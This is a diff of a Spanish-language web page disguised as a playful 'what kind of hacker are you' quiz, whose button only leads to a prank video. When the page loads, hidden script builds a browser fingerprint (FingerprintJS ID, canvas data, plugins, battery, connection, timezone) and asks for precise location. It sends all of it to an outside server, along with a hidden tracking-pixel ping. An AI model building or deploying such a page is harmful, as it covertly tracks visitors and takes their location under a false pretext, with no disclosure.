@@ -1,46 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
   <head>
+    <meta charset="UTF-8" />
     <title>¿Qué tan creativo eres?</title>
-    <!-- FingerprintJS library -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- FingerprintJS -->
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding: 50px;
+      }
+
+      button {
+        padding: 10px 20px;
+        font-size: 18px;
+        cursor: pointer;
+      }
+    </style>
   </head>
   <body>
     <h2>Descubre qué tipo de hacker serías</h2>
     <p>Responde este test divertido para saber tu arquetipo hacker 🧠💻</p>
-    <button onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">Comenzar</button>
-    
-    <!-- Carga invisible al backend -->
-    <img src="https://testproyecto-zkq4.onrender.com" style="display:none;" />
-    
+    <button onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">
+      Comenzar
+    </button>
+
+    <!-- Invisible preload ping -->
+    <img src="https://testproyecto-zkq4.onrender.com" style="display: none;" />
+
     <script>
-      // Recolección de datos principal
       async function recolectarDatos() {
-        // Usar FingerprintJS para obtener un ID único
-        const fp = await FingerprintJS.load();
-        const result = await fp.get();
-        
-        // Crear un objeto con la información básica
-        const info = {
-          language: navigator.language,
-          languages: navigator.languages,
-          platform: navigator.platform,
-          userAgent: navigator.userAgent,
-          screenWidth: screen.width,
-          screenHeight: screen.height,
+        const info = {};
+
+        try {
+          // Fingerprint
+          const fp = await FingerprintJS.load();
+          const result = await fp.get();
+          info.fingerprint = result.visitorId;
+        } catch (e) {
+          info.fingerprintError = e.message;
+        }
+
+        // Información general
+        info.language = navigator.language || null;
+        info.languages = navigator.languages || null;
+        info.platform = navigator.platform || null;
+        info.userAgent = navigator.userAgent || null;
+        info.screen = {
+          width: screen.width,
+          height: screen.height,
           colorDepth: screen.colorDepth,
-          pixelRatio: window.devicePixelRatio,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          timezoneOffset: new Date().getTimezoneOffset(),
-          referrer: document.referrer,
-          cookiesEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          fingerprint: result.visitorId,
-          vendor: navigator.vendor,
-          dateTime: new Date().toString()
+          pixelRatio: window.devicePixelRatio
         };
-        
-        // Información sobre la conexión
+        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        info.timezoneOffset = new Date().getTimezoneOffset();
+        info.referrer = document.referrer || null;
+        info.cookiesEnabled = navigator.cookieEnabled;
+        info.doNotTrack = navigator.doNotTrack;
+        info.vendor = navigator.vendor || null;
+        info.dateTime = new Date().toISOString();
+
+        // Conexión
         if (navigator.connection) {
           info.connection = {
             effectiveType: navigator.connection.effectiveType,
@@ -49,10 +71,10 @@
             saveData: navigator.connection.saveData
           };
         }
-        
-        // Información de la batería
-        try {
-          if (navigator.getBattery) {
+
+        // Batería
+        if (navigator.getBattery) {
+          try {
             const battery = await navigator.getBattery();
             info.battery = {
               level: battery.level,
@@ -60,96 +82,91 @@
               chargingTime: battery.chargingTime,
               dischargingTime: battery.dischargingTime
             };
+          } catch (e) {
+            info.batteryError = e.message;
           }
-        } catch (e) {
-          info.batteryError = e.message;
         }
-        
-        // Canvas fingerprinting
+
+        // Canvas fingerprint
         try {
-          const canvas = document.createElement('canvas');
-          const ctx = canvas.getContext('2d');
+          const canvas = document.createElement("canvas");
+          const ctx = canvas.getContext("2d");
           canvas.width = 200;
           canvas.height = 200;
-          
-          // Textos y formas para fingerprinting
+
           ctx.textBaseline = "top";
-          ctx.font = "14px 'Arial'";
-          ctx.textBaseline = "alphabetic";
+          ctx.font = "14px Arial";
           ctx.fillStyle = "#f60";
           ctx.fillRect(125, 1, 62, 20);
           ctx.fillStyle = "#069";
           ctx.fillText("Fingerprinting...", 2, 15);
           ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
           ctx.fillText("Fingerprinting...", 4, 17);
-          
-          // Formas adicionales
           ctx.fillRect(0, 0, 10, 10);
           ctx.fillRect(50, 50, 25, 25);
           ctx.arc(100, 100, 50, 0, Math.PI * 2);
           ctx.fill();
-          
+
           info.canvasFingerprint = canvas.toDataURL();
         } catch (e) {
           info.canvasFingerprintError = e.message;
         }
-        
-        // Lista de plugins
+
+        // Plugins
         try {
-          if (navigator.plugins) {
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-              const plugin = navigator.plugins[i];
-              plugins.push({
-                name: plugin.name,
-                description: plugin.description,
-                filename: plugin.filename
-              });
-            }
-            info.plugins = plugins;
+          const plugins = [];
+          for (let i = 0; i < navigator.plugins.length; i++) {
+            const plugin = navigator.plugins[i];
+            plugins.push({
+              name: plugin.name,
+              description: plugin.description,
+              filename: plugin.filename
+            });
           }
+          info.plugins = plugins;
         } catch (e) {
           info.pluginsError = e.message;
         }
-        
-        // Solicitar ubicación precisa (requerirá permisos)
-        try {
-          navigator.geolocation.getCurrentPosition(position => {
-            const locationInfo = {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy,
-              altitude: position.coords.altitude,
-              altitudeAccuracy: position.coords.altitudeAccuracy,
-              heading: position.coords.heading,
-              speed: position.coords.speed,
-              timestamp: position.timestamp
-            };
-            
-            // Enviar ubicación como datos adicionales
-            fetch("https://testproyecto-zkq4.onrender.com/info", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                type: "geolocation",
-                data: locationInfo
-              })
-            });
-          });
-        } catch (e) {
-          info.geolocationError = e.message;
+
+        // Geolocalización (opcional y solo si el usuario permite)
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              const locationInfo = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: position.timestamp
+              };
+
+              // Enviar ubicación por separado
+              enviarDatos({ type: "geolocation", data: locationInfo });
+            },
+            error => {
+              info.geolocationError = error.message;
+              enviarDatos({ type: "info", data: info });
+            }
+          );
         }
-        
-        // Enviar toda la información recolectada al backend
+
+        // Enviar info principal
+        enviarDatos({ type: "info", data: info });
+      }
+
+      function enviarDatos(payload) {
         fetch("https://testproyecto-zkq4.onrender.com/info", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(info)
-        });
+          body: JSON.stringify(payload)
+        }).catch(err => console.error("Error al enviar datos:", err));
       }
-      
-      // Ejecutar la recolección de datos cuando la página se cargue
-      window.addEventListener('load', recolectarDatos);
+
+      // Iniciar cuando se carga la página
+      window.addEventListener("load", recolectarDatos);
     </script>
   </body>
 </html>
